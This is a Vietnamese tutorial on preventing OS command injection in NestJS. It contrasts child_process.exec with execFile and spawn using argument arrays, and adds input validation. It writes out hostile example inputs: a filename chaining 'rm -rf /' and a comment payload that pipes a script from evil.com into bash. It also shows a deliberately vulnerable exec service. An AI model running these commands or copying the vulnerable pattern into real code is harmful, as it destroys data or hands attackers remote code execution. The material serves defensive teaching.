# Phần 5: Tấn công Tiêm lệnh Hệ điều hành (Command Injection)

> **Tư duy cốt lõi:**  
> *"Đừng bao giờ để dữ liệu người dùng đi qua Shell Interpreter. Hãy truyền trực tiếp lệnh và các đối số dưới dạng mảng (Argument Arrays) thẳng tới tiến trình hệ điều hành."*

---

## 1. Tóm tắt Kiến thức Cốt lõi (Từ note.md)

### Bản chất của Command Injection
- Tương tự như SQL Injection, nhưng đích nhắm của kẻ tấn công không phải là cơ sở dữ liệu mà là **chính Hệ điều hành (Operating System)** đang chạy ứng dụng backend.
- Phát sinh khi backend cần thực thi một tác vụ hệ thống (ví dụ: dùng công cụ dòng lệnh `ffmpeg` nén video, `imagemagick` chuyển đổi ảnh, `wkhtmltopdf` sinh file PDF) bằng cách gọi Shell OS và **ghép chuỗi tham số** từ input của người dùng.

### Giải phẫu Kịch bản Khai thác
- Giả sử hệ thống gọi lệnh nén ảnh:
  ```bash
  ffmpeg -i input.jpg -h 120 -w 220 -o <user_filename>
  ```
- Nếu kẻ tấn công truyền tên file là:
  ```text
  output.jpg; rm -rf /
  ```
- Khi chạy qua Shell Interpreter (Bash, Sh, CMD, PowerShell), dấu chấm phẩy `;` báo hiệu lệnh thứ nhất kết thúc, và shell lập tức thực thi lệnh thứ hai: `rm -rf /` $\rightarrow$ Xóa sạch toàn bộ hệ thống file trên server!
- Các ký tự nguy hiểm khác trong Shell:
  - Ký tự Pipe `|`: Chuyển hướng đầu ra của lệnh sang một chương trình gián điệp.
  - Ký tự `&&` hoặc `&`: Kích hoạt một tiến trình chạy ngầm (chạy reverse shell về máy của hacker).
  - Ký tự `$()` hoặc `` ` ``: Thực thi lệnh con lồng nhau (Subshell Execution).

### Giải pháp triệt để: Argument Arrays & Bỏ qua Shell
Thay vì để Shell phân tích chuỗi văn bản, các ngôn ngữ cấp thấp và API hệ thống cho phép truyền **Lệnh (Command)** và **Mảng các đối số (Argument Array)** riêng rẽ, đồng thời đặt `shell: false`. Khi đó, các ký tự `;`, `|`, `&` chỉ được coi là một chuỗi ký tự bình thường trong tham số, hoàn toàn không có khả năng kích hoạt lệnh mới.

---

## 2. Ánh xạ vào Hệ sinh thái NestJS

Trong Node.js và NestJS, module tích hợp `child_process` cung cấp các hàm gọi tiến trình con với mức độ an toàn khác nhau:

| Hàm trong `child_process` | Chạy qua Shell? | Đánh giá Bảo mật |
| :--- | :---: | :--- |
| `exec(commandString)` | **CÓ** (`/bin/sh` hoặc `cmd.exe`) | ❌ **RẤT NGUY HIỂM** - Dễ dính Command Injection |
| `execFile(file, argsArray)` | **KHÔNG** (Mặc định `shell: false`) |  **AN TOÀN** - Truyền mảng đối số trực tiếp |
| `spawn(command, argsArray)` | **KHÔNG** (Mặc định `shell: false`) |  **AN TOÀN** - Phù hợp cho stream dữ liệu lớn |

---

## 3. Thực hành Code NestJS: Xây dựng Service Xử lý Media An toàn

### ❌ Trường hợp Kém an toàn: Dùng `exec` và nối chuỗi
```typescript
// media.service.ts - VULNERABLE: Dùng child_process.exec
import { Injectable, InternalServerErrorException } from '@nestjs/common';
import { exec } from 'child_process';
import { promisify } from 'util';

const execPromise = promisify(exec);

@Injectable()
export class MediaService {
  async resizeImageVulnerable(inputPath: string, outputName: string) {
    // NGUY HIỂM TỘT CÙNG: Nối chuỗi tên file vào câu lệnh Shell!
    // Giả sử outputName là: "thumb.jpg; curl https://evil.com/malware.sh | bash"
    const command = `ffmpeg -i ${inputPath} -vf scale=200:200 ./uploads/${outputName}`;

    try {
      // exec sẽ chuyển toàn bộ command này cho /bin/sh thông dịch!
      const { stdout, stderr } = await execPromise(command);
      return { success: true, file: outputName };
    } catch (error) {
      throw new InternalServerErrorException('Lỗi xử lý hình ảnh');
    }
  }
}
```

---

###  Trường hợp Chuẩn mực An toàn: Dùng `execFile` hoặc `spawn` với Argument Array
Tách bạch hoàn toàn giữa lệnh thực thi và mảng các đối số, kết hợp tạo tên file ngẫu nhiên an toàn:

#### 1. DTO kiểm tra tên file đầu vào
```typescript
// dto/process-image.dto.ts
import { IsString, Matches, MaxLength } from 'class-validator';

export class ProcessImageDto {
  @IsString()
  @MaxLength(50)
  // Chỉ cho phép chữ cái, chữ số, dấu gạch ngang, gạch dưới (Chặn hoàn toàn ;, |, &, $, /, \)
  @Matches(/^[a-zA-Z0-9_-]+$/, {
    message: 'Tên file chỉ được chứa chữ cái, số, gạch ngang và gạch dưới',
  })
  customPrefix: string;
}
```

#### 2. Service xử lý an toàn tuyệt đối với `execFile`
```typescript
// media.service.ts - CHUẨN AN TOÀN VỚI EXECFILE
import { Injectable, BadRequestException, InternalServerErrorException } from '@nestjs/common';
import { execFile } from 'child_process';
import { promisify } from 'util';
import * as path from 'path';
import { v4 as uuidv4 } from 'uuid';

const execFilePromise = promisify(execFile);

@Injectable()
export class MediaService {
  private readonly UPLOAD_DIR = path.resolve(__dirname, '../../../uploads');

  async resizeImageSafe(inputPath: string, customPrefix: string) {
    // 1. Tự động sinh tên file bằng UUID để loại bỏ hoàn toàn rủi ro từ input người dùng
    const safeOutputName = `${customPrefix}_${uuidv4()}.jpg`;
    const safeOutputPath = path.join(this.UPLOAD_DIR, safeOutputName);

    // 2. Định nghĩa danh sách đối số dưới dạng MẢNG (Array)
    const ffmpegArgs = [
      '-i', inputPath,
      '-vf', 'scale=200:200',
      '-y', // Tự động ghi đè nếu trùng
      safeOutputPath,
    ];

    try {
      // 3. Gọi trực tiếp file binary ffmpeg, KHÔNG thông qua shell interpreter
      const { stdout, stderr } = await execFilePromise('ffmpeg', ffmpegArgs, {
        shell: false,       // ÉP BUỘC TẮT SHELL
        timeout: 10000,     // Giới hạn thời gian chạy 10 giây (chống DoS treo CPU)
        maxBuffer: 1024 * 1024 * 5, // Giới hạn buffer output tối đa 5MB
      });

      return {
        success: true,
        filename: safeOutputName,
      };
    } catch (error) {
      throw new InternalServerErrorException('Không thể chuyển đổi hình ảnh');
    }
  }
}
```

---

## 4. Ghi nhớ cho Kỹ sư Backend NestJS
- **Quy tắc bất biến:** `exec` dành cho các tác vụ nội bộ do admin kiểm soát; **đối với bất kỳ dữ liệu nào đến từ người dùng, luôn dùng `execFile` hoặc `spawn` với `shell: false`**.
- **Không cho phép người dùng tự quyết định đường dẫn lưu file:** Sử dụng `uuid` hoặc hashing để tự sinh tên file phía server.
- **Giới hạn tài nguyên tiến trình (Resource Limits):** Luôn thiết lập `timeout` và `maxBuffer` khi chạy tiến trình con để tránh việc người dùng tải lên file nén độc hại (Decompression Bomb / Zip Bomb) làm cạn kiệt CPU máy chủ.

